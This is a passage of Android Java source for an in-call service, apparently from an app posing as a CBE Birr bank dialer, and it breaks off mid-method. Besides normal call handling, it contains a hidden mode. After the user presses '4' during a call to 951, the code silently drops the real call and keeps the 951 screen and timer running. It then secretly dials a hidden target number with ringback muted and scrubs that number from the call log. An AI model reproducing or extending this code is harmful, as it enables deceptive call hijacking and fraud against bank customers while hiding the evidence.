package com.cbe.cbebirrdialer;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Person;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioDeviceInfo;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.os.VibratorManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telecom.Call;
import android.telecom.CallAudioState;
import android.telecom.InCallService;
import android.telecom.VideoProfile;
import java.util.List;
import org.json.JSONObject;

/**
 * Full Default-Dialer InCallService (Android 7 - Android 16):
 * 1. Handles ALL normal incoming & outgoing calls natively (with lockscreen wake, CallStyle notification,
 *    Answer/Decline/HangUp, Mute, Hold, Speaker, Bluetooth, DTMF, and Answer/End vibration).
 * 2. Handles Real-SIM 951 call with seamless handoff on digit '4': disconnects real 951 silently without
 *    dropping the UI or resetting the timer, plays Hold MP3, dials secret target with carrier ringback
 *    muted, unmutes on answer + vibrates, scrubs hidden target from CallLog, and triggers Survey MP3 on end.
 */
public class SecretInCallService extends InCallService {

    public static final int MODE_NONE = 0;
    public static final int MODE_NATIVE_NORMAL = 1;
    public static final int MODE_REAL_951 = 2;
    public static final int MODE_SECRET_TARGET = 3;

    private static final int CALL_NOTIF_ID = 95101;
    private static final String CHANNEL_INCOMING_ID = "phone_incoming_call_v3";
    private static final String CHANNEL_ONGOING_ID = "phone_ongoing_call_v3";

    public static volatile SecretInCallService instance = null;
    private static volatile Call currentCall = null;
    private static volatile int activeCallMode = MODE_NONE;

    // 951 Secret / Hybrid state
    private static volatile boolean real951Armed = false;
    private static volatile boolean handoffInProgress = false;
    private static volatile boolean secretModeActive = false;
    private static volatile String hiddenTargetNumber = "";
    private static volatile int maxRingTimeoutMs = 8000;
    private static volatile boolean wasAnsweredLive = false;
    private static volatile boolean secretRemoteEndDispatched = false;
    private static volatile long secretConnectTimeMs = 0L;
    private static volatile boolean cancelledByTimeout = false;
    private static volatile boolean cancelledByUser = false;
    private static volatile long cancelledAtMs = 0L;
    private static volatile long secretArmSeq = 0L;
    private static volatile int attemptCount = 0;
    private static volatile boolean secretSpeakerWanted = true;
    private static volatile boolean secretMutedWanted = false;

    // Voice stream suppression tracking
    private static volatile int savedVoiceCallVolume = -1;
    private static volatile boolean streamVoiceMutedByUs = false;

    // Native normal call state tracking
    private static volatile String nativeNumber = "";
    private static volatile String nativeLabel = "";
    private static volatile boolean nativeIncoming = false;
    private static volatile String nativeCallStateStr = "idle";
    private static volatile long nativeConnectTimeMs = 0L;
    private static volatile boolean nativeVibratedActive = false;
    private static volatile boolean nativeVibratedEnd = false;
    private static volatile boolean secretVibratedActive = false;
    private static volatile boolean secretVibratedEnd = false;
    private static volatile boolean nativeSpeakerWanted = false;
    private static volatile boolean localSoftHoldActive = false;
    private static volatile boolean pendingSpeakerWanted = false;
    private static volatile boolean pendingBluetoothWanted = false;
    private static volatile long pendingAudioRouteUntilMs = 0L;
    private static volatile long audioRouteSeq = 0L;
    private static volatile boolean standaloneAudioActive = false;
    private static volatile boolean standaloneSpeakerWanted = true;
    private static volatile boolean standaloneBluetoothWanted = false;

    private static final Handler staticMainHandler = new Handler(Looper.getMainLooper());
    private final Handler mainHandler = staticMainHandler;
    private PowerManager.WakeLock screenWakeLock = null;

    private final Runnable verifySoftHoldRunnable = new Runnable() {
        @Override
        public void run() {
            Call c = currentCall;
            if (c == null) return;
            int st = getCallStateSafe(c);
            if (st == Call.STATE_ACTIVE && !localSoftHoldActive && "holding".equals(pendingHoldAction)) {
                localSoftHoldActive = true;
                silenceCarrierCallAudio(true);
                refreshCallNotification();
                pushNativeStateToWeb();
            }
            pendingHoldAction = "";
        }
    };

    private static volatile String pendingHoldAction = "";

    private final Runnable foregroundGuardRunnable = new Runnable() {
        @Override
        public void run() {
            boolean shouldBeFront = secretModeActive || activeCallMode == MODE_REAL_951
                || (activeCallMode == MODE_NATIVE_NORMAL
                    && ("ringing".equals(nativeCallStateStr) || "dialing".equals(nativeCallStateStr)));
            if (shouldBeFront && !MainActivity.isActivityForeground) {
                launchMainToFront(true);
            }
        }
    };

    private final Runnable twoRingTimeoutRunnable = new Runnable() {
        @Override
        public void run() {
            if (!secretModeActive || currentCall == null || wasAnsweredLive) return;
            int st = getCallStateSafe(currentCall);
            if (st != Call.STATE_ACTIVE) {
                cancelledByTimeout = true;
                try {
                    silenceCarrierCallAudio(true);
                    currentCall.disconnect();
                } catch (Throwable ignored) {
                }
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                    );
                }
            }
        }
    };

    private final Call.Callback callCallback = new Call.Callback() {
        @Override
        public void onStateChanged(Call call, int state) {
            super.onStateChanged(call, state);
            handleCallState(call, state);
        }

        @Override
        public void onDetailsChanged(Call call, Call.Details details) {
            super.onDetailsChanged(call, details);
            if (call == currentCall && activeCallMode == MODE_NATIVE_NORMAL) {
                updateNativeLabelFromCall(call);
                refreshCallNotification();
                pushNativeStateToWeb();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        ensureNotificationChannels();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (instance == this) {
            instance = null;
        }
        mainHandler.removeCallbacks(twoRingTimeoutRunnable);
        mainHandler.removeCallbacks(foregroundGuardRunnable);
        silenceCarrierCallAudio(false);
        releaseWakeLock();
        stopCallNotification();
    }

    public static boolean isSecretCallActive() {
        return secretModeActive || activeCallMode == MODE_REAL_951;
    }

    public static boolean hasAnyActiveCall() {
        return currentCall != null || activeCallMode != MODE_NONE || handoffInProgress;
    }

    public static boolean isCarrierStreamSilenced() {
        return streamVoiceMutedByUs;
    }

    public static boolean isSpeakerWantedForUi() {
        if (currentCall != null) {
            return activeCallMode == MODE_NATIVE_NORMAL ? nativeSpeakerWanted : secretSpeakerWanted;
        }
        return standaloneAudioActive ? standaloneSpeakerWanted : secretSpeakerWanted;
    }

    public static boolean isBluetoothWantedForUi() {
        return currentCall != null ? pendingBluetoothWanted : standaloneBluetoothWanted;
    }

    public static void armReal951Call() {
        real951Armed = true;
        handoffInProgress = false;
        secretModeActive = false;
        wasAnsweredLive = false;
        secretRemoteEndDispatched = false;
        secretConnectTimeMs = 0L;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        secretVibratedActive = false;
        secretVibratedEnd = false;
        secretMutedWanted = false;
        secretSpeakerWanted = true;
        standaloneSpeakerWanted = true;
        standaloneBluetoothWanted = false;
    }

    public static void beginSeamlessHandoffFromReal951() {
        handoffInProgress = true;
        real951Armed = false;
        secretConnectTimeMs = 0L;
        final Call oldCall = currentCall;
        if (instance != null) {
            instance.silenceCarrierCallAudio(true);
        }
        if (oldCall != null) {
            try {
                oldCall.disconnect();
            } catch (Throwable ignored) {
            }
        }
        if (instance != null) {
            instance.postOrUpdateCallNotification("951", "Connecting...", false, false, 0L);
        }
    }

    public static long armSecretCall(String targetNumber, int maxRingMs) {
        hiddenTargetNumber = targetNumber != null ? targetNumber.trim() : "";
        maxRingTimeoutMs = Math.max(3500, Math.min(25000, maxRingMs));
        secretArmSeq += 1L;
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = true;
        wasAnsweredLive = false;
        secretRemoteEndDispatched = false;
        secretConnectTimeMs = 0L;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        secretVibratedActive = false;
        secretVibratedEnd = false;
        return secretArmSeq;
    }

    public static boolean isArmSeqActive(long seq) {
        return secretModeActive && !cancelledByUser && secretArmSeq == seq;
    }

    public static void markUserCancelledNow() {
        secretArmSeq += 1L;
        cancelledByUser = true;
        cancelledAtMs = System.currentTimeMillis();
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = false;
        secretRemoteEndDispatched = false;
    }

    public static void resetSecretState() {
        secretArmSeq += 1L;
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = false;
        wasAnsweredLive = false;
        secretRemoteEndDispatched = false;
        secretConnectTimeMs = 0L;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        attemptCount = 0;
        hiddenTargetNumber = "";
        secretVibratedActive = false;
        secretVibratedEnd = false;
        localSoftHoldActive = false;
        pendingHoldAction = "";
        if (activeCallMode == MODE_REAL_951 || activeCallMode == MODE_SECRET_TARGET) {
            activeCallMode = MODE_NONE;
        }
        NativeAudioEngine.stop(resolveAudioContext(MainActivity.currentInstance), true);
        if (instance != null) {
            instance.clearForegroundGuards();
            instance.silenceCarrierCallAudio(false);
            instance.stopCallNotification();
        }
        setStandaloneCallAudioActive(MainActivity.currentInstance, false, false);
    }

    public static void disconnectActiveSecretCall() {
        boolean hadLiveOrRinging = currentCall != null && (secretModeActive || activeCallMode == MODE_REAL_951);
        markUserCancelledNow();
        localSoftHoldActive = false;
        pendingHoldAction = "";
        if (instance != null) {
            instance.mainHandler.removeCallbacks(instance.twoRingTimeoutRunnable);
            instance.mainHandler.removeCallbacks(instance.verifySoftHoldRunnable);
            instance.clearForegroundGuards();
            instance.silenceCarrierCallAudio(false);
            if (hadLiveOrRinging && !secretVibratedEnd) {
                secretVibratedEnd = true;
                instance.vibrateCallEvent();
            }
            instance.stopCallNotification();
        }
        if (currentCall != null) {
            try {
                currentCall.disconnect();
            } catch (Throwable ignored) {
            }
        }
        if (activeCallMode == MODE_REAL_951 || activeCallMode == MODE_SECRET_TARGET) {
            activeCallMode = MODE_NONE;
        }
        setStandaloneCallAudioActive(MainActivity.currentInstance, false, false);
    }

    public static void bringUiToFrontIfSecret() {
        if (!secretModeActive && activeCallMode != MODE_REAL_951) return;
        if (instance != null) {
            instance.launchMainToFront(true);
        } else if (MainActivity.currentInstance != null) {
            MainActivity.currentInstance.bringToFrontForCall();
        }
    }

    public static void bringAnyActiveCallUiToFront(Context ctx) {
        if (instance != null) {
            instance.launchMainToFront(true);
        } else if (ctx != null) {
            try {
                Intent bring = new Intent(ctx, MainActivity.class);
                bring.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                );
                bring.putExtra("native_call_action", "show");
                ctx.startActivity(bring);
            } catch (Throwable ignored) {
            }
        }
    }

    private static Context resolveAudioContext(Context fallbackCtx) {
        if (instance != null) return instance;
        if (fallbackCtx != null) return fallbackCtx.getApplicationContext();
        if (MainActivity.currentInstance != null) return MainActivity.currentInstance.getApplicationContext();
        return null;
    }

    private static void applyAudioManagerRouting(Context ctx, boolean active, boolean speakerOn, boolean manageMode) {
        Context appCtx = resolveAudioContext(ctx);
        if (appCtx == null) return;
        if (!manageMode && !active) return;
        NativeAudioEngine.applyStandaloneCommunicationRouting(
            appCtx,
            active,
            speakerOn,
            standaloneBluetoothWanted
        );
    }

    public static void setStandaloneCallAudioActive(final Context ctx, final boolean active, final boolean speakerOn) {
        standaloneAudioActive = active;
        standaloneSpeakerWanted = speakerOn;
        if (active) {
            secretSpeakerWanted = speakerOn;
        } else {
            standaloneBluetoothWanted = false;
        }
        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                // Only manage AudioManager mode directly when no carrier Telecom call owns MODE_IN_CALL
                if (currentCall == null || activeCallMode == MODE_NONE) {
                    applyAudioManagerRouting(ctx, active, speakerOn, true);
                }
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.updateVolumeStreamForCall(active || hasAnyActiveCall());
                }
            }
        });
    }

    @SuppressWarnings("deprecation")
    private int resolveNonSpeakerRoute() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            boolean wiredConnected = false;
            if (am != null && Build.VERSION.SDK_INT >= 23) {
                AudioDeviceInfo[] outs = am.getDevices(AudioManager.GET_DEVICES_OUTPUTS);
                if (outs != null) {
                    for (AudioDeviceInfo dev : outs) {
                        if (dev == null) continue;
                        int t = dev.getType();
                        if (t == AudioDeviceInfo.TYPE_WIRED_HEADSET
                            || t == AudioDeviceInfo.TYPE_WIRED_HEADPHONES
                            || t == AudioDeviceInfo.TYPE_USB_HEADSET) {
                            wiredConnected = true;
                            break;
                        }
                    }
                }
            }
            CallAudioState as = getCallAudioState();
            if (as != null) {
                int mask = as.getSupportedRouteMask();
                if (wiredConnected && (mask & CallAudioState.ROUTE_WIRED_HEADSET) != 0) {
                    return CallAudioState.ROUTE_WIRED_HEADSET;
                }
                if ((mask & CallAudioState.ROUTE_EARPIECE) != 0) {
                    return CallAudioState.ROUTE_EARPIECE;
                }
                if ((mask & CallAudioState.ROUTE_WIRED_HEADSET) != 0) {
                    return CallAudioState.ROUTE_WIRED_HEADSET;
                }
            }
        } catch (Throwable ignored) {
        }
        return CallAudioState.ROUTE_EARPIECE;
    }

    public static void setSpeakerEnabled(final boolean on) {
        secretSpeakerWanted = on;
        nativeSpeakerWanted = on;
        standaloneSpeakerWanted = on;
        pendingSpeakerWanted = on;
        if (on) {
            pendingBluetoothWanted = false;
            standaloneBluetoothWanted = false;
        }
        pendingAudioRouteUntilMs = System.currentTimeMillis() + 900L;
        final long mySeq = ++audioRouteSeq;

        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                final SecretInCallService svc = instance;
                if (svc != null && currentCall != null) {
                    final int targetRoute = on ? CallAudioState.ROUTE_SPEAKER : svc.resolveNonSpeakerRoute();
                    try {
                        svc.setAudioRoute(targetRoute);
                    } catch (Throwable ignored) {
                    }
                    svc.refreshCallNotification();
                    svc.pushNativeStateToWeb();
                    // Re-assert Telecom route only if this is still the latest toggle and Telecom hadn't finished attaching audio stream
                    staticMainHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (audioRouteSeq == mySeq && instance == svc && currentCall != null && pendingSpeakerWanted == on) {
                                try {
                                    CallAudioState as = svc.getCallAudioState();
                                    boolean currentlySpeaker = as != null && as.getRoute() == CallAudioState.ROUTE_SPEAKER;
                                    if (currentlySpeaker != on) {
                                        svc.setAudioRoute(on ? CallAudioState.ROUTE_SPEAKER : svc.resolveNonSpeakerRoute());
                                    }
                                } catch (Throwable ignored) {
                                }
                            }
                        }
                    }, 180L);
                } else {
                    // Standalone 951 MP3 / AI / Post-Call Survey mode (no active Telecom call)
                    standaloneAudioActive = true;
                    applyAudioManagerRouting(MainActivity.currentInstance, true, on, true);
                }
            }
        });
    }

    @SuppressWarnings("deprecation")
    public static void setBluetoothEnabled(final boolean on) {
        pendingBluetoothWanted = on;
        standaloneBluetoothWanted = on;
        if (on) {
            pendingSpeakerWanted = false;
            nativeSpeakerWanted = false;
            secretSpeakerWanted = false;
            standaloneSpeakerWanted = false;
        }
        pendingAudioRouteUntilMs = System.currentTimeMillis() + 1400L;
        audioRouteSeq += 1L;

        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                SecretInCallService svc = instance;
                if (svc != null && currentCall != null) {
                    try {
                        boolean restoreSpeaker = (activeCallMode == MODE_NATIVE_NORMAL)
                            ? nativeSpeakerWanted
                            : secretSpeakerWanted;
                        int targetRoute = on
                            ? CallAudioState.ROUTE_BLUETOOTH
                            : (restoreSpeaker ? CallAudioState.ROUTE_SPEAKER : svc.resolveNonSpeakerRoute());
                        svc.setAudioRoute(targetRoute);
                    } catch (Throwable ignored) {
                    }
                    svc.refreshCallNotification();
                    svc.pushNativeStateToWeb();
                } else {
                    standaloneAudioActive = true;
                    applyAudioManagerRouting(MainActivity.currentInstance, true, standaloneSpeakerWanted, true);
                }
            }
        });
    }

    public static void setCallMuted(final boolean muted) {
        secretMutedWanted = muted;
        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                SecretInCallService svc = instance;
                if (svc != null) {
                    try {
                        svc.setMuted(muted);
                    } catch (Throwable ignored) {
                    }
                }
                Context ctx = resolveAudioContext(MainActivity.currentInstance);
                if (ctx != null) {
                    try {
                        AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                        if (am != null) {
                            am.setMicrophoneMute(muted);
                        }
                    } catch (Throwable ignored) {
                    }
                }
                if (svc != null) {
                    svc.refreshCallNotification();
                    svc.pushNativeStateToWeb();
                }
            }
        });
    }

    public static void setActiveCallHeld(final boolean hold) {
        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                final SecretInCallService svc = instance;
                final Call c = currentCall;
                if (c == null) {
                    // Standalone WebView / AI 951 mode
                    localSoftHoldActive = hold;
                    Context ctx = resolveAudioContext(MainActivity.currentInstance);
                    if (ctx != null) {
                        try {
                            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                            if (am != null) {
                                am.setMicrophoneMute(hold || secretMutedWanted);
                            }
                        } catch (Throwable ignored) {
                        }
                    }
                    return;
                }

                if (svc != null) {
                    svc.mainHandler.removeCallbacks(svc.verifySoftHoldRunnable);
                }

                int st = svc != null ? svc.getCallStateSafe(c) : Call.STATE_ACTIVE;
                boolean canCarrierHold = false;
                try {
                    Call.Details details = c.getDetails();
                    if (details != null) {
                        canCarrierHold = (details.getCallCapabilities() & Call.Details.CAPABILITY_HOLD) != 0;
                    }
                } catch (Throwable ignored) {
                }

                if (hold) {
                    if (st == Call.STATE_HOLDING || localSoftHoldActive) {
                        if (svc != null) svc.pushNativeStateToWeb();
                        return;
                    }
                    if (st == Call.STATE_ACTIVE && canCarrierHold) {
                        pendingHoldAction = "holding";
                        try {
                            c.hold();
                        } catch (Throwable ignored) {
                            pendingHoldAction = "";
                            localSoftHoldActive = true;
                            if (svc != null) {
                                svc.silenceCarrierCallAudio(true);
                            }
                        }
                        if (svc != null) {
                            svc.mainHandler.postDelayed(svc.verifySoftHoldRunnable, 650L);
                            svc.pushNativeStateToWeb();
                        }
                    } else {
                        // Carrier lacks CAPABILITY_HOLD or call is still connecting -> genuine audio soft-hold on system stream
                        pendingHoldAction = "";
                        localSoftHoldActive = true;
                        if (svc != null) {
                            svc.silenceCarrierCallAudio(true);
                            svc.refreshCallNotification();
                            svc.pushNativeStateToWeb();
                        }
                    }
                } else {
                    pendingHoldAction = "";
                    boolean wasSoftHeld = localSoftHoldActive;
                    localSoftHoldActive = false;
                    if (st == Call.STATE_HOLDING) {
                        try {
                            c.unhold();
                        } catch (Throwable ignored) {
                        }
                    }
                    if (svc != null) {
                        if (wasSoftHeld && activeCallMode != MODE_SECRET_TARGET) {
                            svc.silenceCarrierCallAudio(false);
                        } else if (activeCallMode == MODE_SECRET_TARGET && wasAnsweredLive) {
                            svc.silenceCarrierCallAudio(false);
                        }
                        setCallMuted(secretMutedWanted);
                        svc.refreshCallNotification();
                        svc.pushNativeStateToWeb();
                    }
                }
            }
        });
    }

    public static void sendActiveCallDtmf(String digit) {
        final Call c = currentCall;
        if (c == null || digit == null || digit.isEmpty()) return;
        final char ch = digit.charAt(0);
        staticMainHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    c.playDtmfTone(ch);
                    staticMainHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                c.stopDtmfTone();
                            } catch (Throwable ignored) {
                            }
                        }
                    }, 180L);
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public static void answerIncomingFromUiOrNotification() {
        Call c = currentCall;
        if (c == null) return;
        try {
            c.answer(VideoProfile.STATE_AUDIO_ONLY);
        } catch (Throwable ignored) {
        }
        if (instance != null) {
            instance.releaseWakeLock();
            instance.launchMainToFront(true);
        }
    }

    public static void rejectOrEndNativeCall() {
        localSoftHoldActive = false;
        pendingHoldAction = "";
        Call c = currentCall;
        if (c == null) {
            if (instance != null) {
                instance.stopCallNotification();
            }
            return;
        }
        try {
            int st = instance != null ? instance.getCallStateSafe(c) : Call.STATE_DISCONNECTED;
            if (st == Call.STATE_RINGING) {
                c.reject(false, null);
            } else {
                c.disconnect();
            }
        } catch (Throwable ignored) {
            try {
                c.disconnect();
            } catch (Throwable ignored2) {
            }
        }
    }

    public static void toggleNativeMuteFromNotification() {
        if (instance == null) return;
        boolean cur = false;
        try {
            CallAudioState as = instance.getCallAudioState();
            cur = as != null && as.isMuted();
        } catch (Throwable ignored) {
        }
        setCallMuted(!cur);
    }

    public static void toggleNativeSpeakerFromNotification() {
        if (instance == null) return;
        boolean cur = false;
        try {
            CallAudioState as = instance.getCallAudioState();
            cur = as != null && (as.getRoute() == CallAudioState.ROUTE_SPEAKER);
        } catch (Throwable ignored) {
        }
        setSpeakerEnabled(!cur);
    }

    public static String getActiveNativeCallStateJson() {
        try {
            JSONObject obj = new JSONObject();
            boolean isNativeActive = activeCallMode == MODE_NATIVE_NORMAL && currentCall != null;
            obj.put("active", isNativeActive);
            obj.put("mode", activeCallMode);
            obj.put("callType", nativeIncoming ? "incoming" : "outgoing");
            String effectiveState = localSoftHoldActive && "active".equals(nativeCallStateStr)
                ? "holding"
                : nativeCallStateStr;
            obj.put("state", isNativeActive ? effectiveState : "idle");
            obj.put("number", nativeNumber != null ? nativeNumber : "");
            obj.put("label", nativeLabel != null ? nativeLabel : "");
            obj.put("connectTimeMs", nativeConnectTimeMs);
            boolean muted = false;
            boolean speaker = false;
            boolean bluetooth = false;
            if (instance != null) {
                try {
                    CallAudioState as = instance.getCallAudioState();
                    if (as != null) {
                        muted = as.isMuted();
                        speaker = as.getRoute() == CallAudioState.ROUTE_SPEAKER;
                        bluetooth = as.getRoute() == CallAudioState.ROUTE_BLUETOOTH;
                    }
                } catch (Throwable ignored) {
                }
            }
            if (System.currentTimeMillis() < pendingAudioRouteUntilMs) {
                speaker = pendingSpeakerWanted;
                bluetooth = pendingBluetoothWanted;
            }
            obj.put("muted", localSoftHoldActive ? secretMutedWanted : muted);
            obj.put("speaker", speaker);
            obj.put("bluetooth", bluetooth);
            obj.put("held", "holding".equals(nativeCallStateStr) || localSoftHoldActive);
            return obj.toString();
        } catch (Throwable ignored) {
            return "{\"active\":false,\"state\":\"idle\"}";
        }
    }

    public static void pushCurrentStateToUi() {
        if (instance != null) {
            instance.pushNativeStateToWeb();
        }
    }

    private void pushNativeStateToWeb() {
        if (MainActivity.currentInstance == null) return;
        final String json = getActiveNativeCallStateJson();
        final String escaped = json
            .replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "");
        MainActivity.currentInstance.notifySecretJs(
            "window.onNativeCallStateChanged && window.onNativeCallStateChanged('" + escaped + "');"
        );
    }

    private void clearForegroundGuards() {
        mainHandler.removeCallbacks(foregroundGuardRunnable);
    }

    private void scheduleForegroundGuards() {
        mainHandler.removeCallbacks(foregroundGuardRunnable);
        mainHandler.postDelayed(foregroundGuardRunnable, 150L);
        mainHandler.postDelayed(foregroundGuardRunnable, 480L);
        mainHandler.postDelayed(foregroundGuardRunnable, 950L);
    }

    private void launchMainToFront(boolean showOverLock) {
        try {
            Intent bringIntent = new Intent(this, MainActivity.class);
            bringIntent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
            );
            if (showOverLock) {
                bringIntent.putExtra("native_call_action", "show");
            }
            startActivity(bringIntent);
        } catch (Throwable ignored) {
            if (MainActivity.currentInstance != null) {
                MainActivity.currentInstance.bringToFrontForCall();
            }
        }
    }

    @Override
    public void onCallAudioStateChanged(CallAudioState audioState) {
        super.onCallAudioStateChanged(audioState);
        if (audioState != null) {
            boolean actualSpeaker = audioState.getRoute() == CallAudioState.ROUTE_SPEAKER;
            boolean actualBt = audioState.getRoute() == CallAudioState.ROUTE_BLUETOOTH;
            if (actualSpeaker == pendingSpeakerWanted && actualBt == pendingBluetoothWanted) {
                pendingAudioRouteUntilMs = 0L;
            }
            if (System.currentTimeMillis() >= pendingAudioRouteUntilMs) {
                secretSpeakerWanted = actualSpeaker;
                nativeSpeakerWanted = actualSpeaker;
                standaloneSpeakerWanted = actualSpeaker;
                standaloneBluetoothWanted = actualBt;
            }
            if ((activeCallMode == MODE_SECRET_TARGET || activeCallMode == MODE_REAL_951)
                && MainActivity.currentInstance != null) {
                MainActivity.currentInstance.notifySecretJs(
                    "window.onSecretCallSpeakerChanged && window.onSecretCallSpeakerChanged("
                        + actualSpeaker + "," + actualBt + ");"
                );
            }
        }
        if (activeCallMode == MODE_NATIVE_NORMAL) {
            pushNativeStateToWeb();
            refreshCallNotification();
        }
    }

    @Override
    public void onBringToForeground(boolean showDialpad) {
        super.onBringToForeground(showDialpad);
        if (hasAnyActiveCall()) {
            launchMainToFront(true);
            scheduleForegroundGuards();
        }
    }

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        if (call == null) return;

        // If user cancelled a secret call right as Telecom added it, kill it silently
        if (!secretModeActive && !real951Armed && cancelledByUser && (System.currentTimeMillis() - cancelledAtMs) < 12000L) {
            try {
                silenceCarrierCallAudio(true);
                call.disconnect();
            } catch (Throwable ignored) {
            }
            scrubHiddenNumberFromSystemCallLog();
            silenceCarrierCallAudio(false);
            return;
        }

        // Unregister callback on any previous call
        if (currentCall != null && currentCall != call) {
            try {
                currentCall.unregisterCallback(callCallback);
            } catch (Throwable ignored) {
            }
        }
        // Release any standalone AudioManager communication lock before Telecom owns MODE_IN_CALL
        if (standaloneAudioActive) {
            NativeAudioEngine.applyStandaloneCommunicationRouting(this, false, false, false);
            standaloneAudioActive = false;
        }
        currentCall = call;

        try {
            call.registerCallback(callCallback);
        } catch (Throwable ignored) {
        }

        if (secretModeActive) {
            activeCallMode = MODE_SECRET_TARGET;
            handoffInProgress = false;
            wasAnsweredLive = false;
            secretRemoteEndDispatched = false;
            secretConnectTimeMs = 0L;
            cancelledByTimeout = false;
            cancelledByUser = false;
            secretVibratedActive = false;
            secretVibratedEnd = false;
            attemptCount += 1;

            silenceCarrierCallAudio(true);
            setSpeakerEnabled(secretSpeakerWanted);
            postOrUpdateCallNotification("951", "Ongoing call", false, false, 0L);
            launchMainToFront(true);
            scheduleForegroundGuards();

            if (MainActivity.currentInstance != null) {
                MainActivity.currentInstance.notifySecretJs(
                    "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                );
            }

            mainHandler.removeCallbacks(twoRingTimeoutRunnable);
            mainHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);
            handleCallState(call, getCallStateSafe(call));
            return;
        }

        if (real951Armed) {
            activeCallMode = MODE_REAL_951;
            real951Armed = false;
            handoffInProgress = false;
            secretConnectTimeMs = 0L;
            secretVibratedActive = false;
            secretVibratedEnd = false;

            silenceCarrierCallAudio(false);
            if (secretSpeakerWanted) {
                setSpeakerEnabled(true);
            }
            postOrUpdateCallNotification("951", "Dialing...", false, false, 0L);
            launchMainToFront(true);
            scheduleForegroundGuards();
            handleCallState(call, getCallStateSafe(call));
            return;
        }

        // Standard incoming / outgoing normal phone call
        activeCallMode = MODE_NATIVE_NORMAL;
        nativeConnectTimeMs = 0L;
        nativeVibratedActive = false;
        nativeVibratedEnd = false;
        nativeSpeakerWanted = false;
        secretMutedWanted = false;
        localSoftHoldActive = false;
        pendingHoldAction = "";
        pendingAudioRouteUntilMs = 0L;
        updateNativeLabelFromCall(call);
        int initState = getCallStateSafe(call);
        nativeIncoming = (initState == Call.STATE_RINGING);
        handleCallState(call, initState);
    }

    private void dispatchSecretRemoteEndedOnce() {
        if (secretRemoteEndDispatched) return;
        secretRemoteEndDispatched = true;
        wasAnsweredLive = false;
        secretModeActive = false;
        activeCallMode = MODE_NONE;
        if (!secretVibratedEnd) {
            secretVibratedEnd = true;
            vibrateCallEvent();
        }
        postOrUpdateCallNotification("951", "Call ending...", false, false, 0L);
        if (MainActivity.currentInstance != null) {
            MainActivity.currentInstance.notifySecretJs(
                "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
            );
        }
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        if (call == null) return;
        try {
            call.unregisterCallback(callCallback);
        } catch (Throwable ignored) {
        }
        if (call != currentCall) {
            return;
        }
        clearForegroundGuards();
        mainHandler.removeCallbacks(twoRingTimeoutRunnable);
        mainHandler.removeCallbacks(verifySoftHoldRunnable);
        currentCall = null;
        localSoftHoldActive = false;
        pendingHoldAction = "";
        pendingAudioRouteUntilMs = 0L;

        if (handoffInProgress) {
            // Keep UI & notification active for seamless handoff to secret target!
            return;
        }

        int modeBeforeClear = activeCallMode;
        boolean wasSecretLiveBeforeClear = wasAnsweredLive;
        boolean wasSecretModeActiveBeforeClear = secretModeActive;

        silenceCarrierCallAudio(false);
        restoreAudioModeNormal();
        if (!hiddenTargetNumber.isEmpty()) {
            scrubHiddenNumberFromSystemCallLog();
        }
        releaseWakeLock();

        if (modeBeforeClear == MODE_SECRET_TARGET && wasSecretModeActiveBeforeClear) {
            if (wasSecretLiveBeforeClear) {
                dispatchSecretRemoteEndedOnce();
                return;
            }
            if (!cancelledByTimeout && !cancelledByUser && MainActivity.currentInstance != null) {
                MainActivity.currentInstance.notifySecretJs(
                    "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                );
                return;
            }
        }

        if (activeCallMode == MODE_NATIVE_NORMAL) {
            activeCallMode = MODE_NONE;
            nativeCallStateStr = "disconnected";
            stopCallNotification();
            pushNativeStateToWeb();
            nativeCallStateStr = "idle";
        } else if (!secretModeActive && !secretRemoteEndDispatched) {
            activeCallMode = MODE_NONE;
            stopCallNotification();
        }
    }

    private void handleCallState(Call call, int state) {
        if (call != currentCall) {
            return;
        }

